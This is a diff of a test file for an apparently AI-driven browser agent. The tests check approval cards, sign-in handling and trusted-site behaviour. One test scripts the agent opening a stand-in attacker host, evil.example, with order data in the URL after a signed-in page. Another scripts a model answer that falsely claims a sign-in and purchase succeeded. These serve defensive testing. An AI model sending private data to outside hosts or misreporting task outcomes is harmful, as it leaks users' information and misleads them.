@@ -106,24 +106,24 @@ async def test_clear_browser_forgets_everything(setup, llm, chat, accounts):
 
 
 async def test_after_a_signed_in_page_a_new_site_is_a_card(setup, llm, chat, accounts):
-    """SPEC §5.6: from then on in the task, a site not opened yet needs the person's approval."""
+    """SPEC §5.2 "Private data": from then on in the task, a site not opened yet needs the person's approval."""
     agent, _, _ = setup
     fe = person(accounts)
     card = await start_sign_in(agent, llm, chat, fe)
-    await agent.approval_reply(fe, card.card["id"], "approve", ["waitrose.com", "fe@example.com", PASSWORD])
+    await agent.approval_reply(fe, card.card["id"], "approve", ["waitrose.com", "fe@example.com", PASSWORD, "false"])
     await settle(agent)
 
     chat.read = len(chat.sent)
     llm.call("browser_navigate", url="https://www.waitrose.com/orders")  # signed in: its own pages stay auto
     llm.call("browser_navigate", url="https://www.waitrose.com/basket")
-    llm.call("browser_navigate", url="https://evil.example/?orders=1234")
+    llm.call("browser_navigate", url="https://evil.example/")
     llm.answer("Done.")
     await agent.inbound(fe, "what did I order last week?")
     card = await chat.next()
-    assert card.card and card.card["title"] == "Open this address? It sends what's in it to evil.example"
+    assert card.card and card.card["title"] == "Open evil.example?"
     await agent.approval_reply(fe, card.card["id"], "decline")
     await settle(agent)
-    assert "declined" in tool_results(llm)[-1]
+    assert "the user stopped it" in tool_results(llm)[-1]
 
     llm.call("browser_navigate", url="https://news.example/")  # a new task that never saw a signed-in page
     llm.answer("Opened.")
@@ -273,7 +273,7 @@ async def test_a_remembered_session_that_ended_is_said_plainly_and_not_glossed_o
     )
     llm.call("browser_navigate", url="https://www.waitrose.com/login")  # the fake page has a password field
     llm.answer("You're signed in to Waitrose, I've added the toilet paper.")  # glosses over the sign-in page
-    llm.call("browser_sign_in", username_target="e1", password_target="e2")
+    llm.call("browser_login")
     await agent.inbound(fe, "add toilet paper to my Waitrose trolley")
     card = await chat.next()
     assert card.card and card.card["kind"] == "signin"
@@ -297,7 +297,7 @@ async def test_a_human_check_on_the_page_is_said_and_a_card_follows(setup, llm, 
     assert card and card["kind"] == "check"
     first = tool_results(llm)[0]
     assert first.startswith('[Aha!: this page shows an "are you human?" check') and "can't tell why" not in first
-    assert "you haven't shown the user a check card" in json.dumps(llm.requests[2]["messages"])
+    assert "you haven't called browser_human_check" in json.dumps(llm.requests[2]["messages"])
     await agent.approval_reply(fe, card["id"], "decline")
     await settle(agent)
 
@@ -318,7 +318,7 @@ def test_human_checks_are_spotted_from_the_page():
 
 
 async def test_on_a_trusted_site_typing_runs_without_a_card(setup, llm, chat, accounts):
-    """SPEC §5.7: the person's own choice, in Settings; never after reading mail."""
+    """SPEC §5.7: the person's own choice, in Settings; the model isn't told."""
     from aha_local.tools import trusted
 
     agent, _, fake = setup
@@ -333,7 +333,8 @@ async def test_on_a_trusted_site_typing_runs_without_a_card(setup, llm, chat, ac
     await settle(agent)
     assert not any(m.card for m in chat.sent)
     assert fake.contexts[-1].fields == {"e1": "fe@example.com"}
-    assert tool_results(llm)[1].startswith("Ran without asking: the user trusts shop.example")
+    assert tool_results(llm)[1].startswith("Typed: “fe@example.com”.")  # as with a card: nothing about trust
+    assert "trust" not in tool_results(llm)[1].lower()
     audit = b"\n".join(fe.vault.records(fe.dir / "audit.jsonl")).decode()
     assert '"trusted": "shop.example"' in audit and "fe@example.com" not in audit
 
@@ -371,7 +372,7 @@ async def test_a_card_is_never_shown_for_a_call_that_would_fail(setup, llm, chat
     assert sum(1 for m in chat.sent if m.card) == 1
 
 
-async def test_password_fields_are_only_ever_filled_through_the_sign_in_card(setup, llm, chat, accounts):
+async def test_password_fields_are_only_ever_filled_through_browser_login(setup, llm, chat, accounts):
     """Seen with the real model (2026-11-22): a login form as an ordinary form card, a real password typed into it."""
     agent, _, _ = setup
     fe = person(accounts)
@@ -387,7 +388,7 @@ async def test_password_fields_are_only_ever_filled_through_the_sign_in_card(set
     await settle(agent)
     assert not any(m.card for m in chat.sent)
     results = tool_results(llm)
-    assert all("is a sign-in field" in r and "browser_sign_in" in r for r in results[1:3])
+    assert all("is a sign-in field" in r and "browser_login" in r for r in results[1:3])
 
 
 async def test_a_new_windows_blank_page_is_said_and_the_last_page_given(setup, llm, chat, accounts):
